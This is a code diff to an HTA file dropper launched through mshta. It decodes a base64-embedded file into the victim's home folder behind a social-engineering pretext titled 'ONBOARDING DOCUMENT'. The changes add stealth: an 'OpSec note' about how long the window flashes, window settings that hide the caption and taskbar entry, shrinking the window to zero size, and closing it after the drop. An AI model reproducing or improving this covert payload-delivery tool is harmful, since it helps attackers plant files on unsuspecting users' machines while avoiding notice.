@@ -5,15 +5,21 @@
 //       mshta <URL to HTA>
 //
 // After it's executed. you should find the file you needed to upload in the user's home directory "C:\Users\username"
+//
+// OpSec note: This script will flash a small, almost unoticeable box in the bottom left corner of the screen for about a half second. 
+// It may be visible for a bit longer if the file you're dropping is overly large. Test in your own environment with your full payload
+// to see how long it stays visible.
 
 <!DOCTYPE html> 
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<HTA:APPLICATION ID="ONBOARDING" WINDOWSTATE="minimize"> <!-- Change the ID to match your pretext !-->
+<HTA:APPLICATION ID="ONBOARDING" WINDOWSTATE="minimize" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" CAPTION="no" SHOWINTASKBAR="no"> <!-- Change the ID to match your pretext !-->
 <head> 
     <title>ONBOARDING DOCUMENT</title><!--Change this to match your pretext !-->
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=9">
     <script language="javascript">
+        //Hide the MSHTA window
+        window.resizeTo(0,0);
         
         //Get the current path
         function getCurrentPath()
@@ -44,6 +50,7 @@
         var v = fso.CreateTextFile(writelocation + "\\enroll.txt", true);
         v.WriteLine(Base64.decode("<Base64 encoded file goes here>"));
         v.Close();
+        window.close();
     </script>
 </head>
 <body>
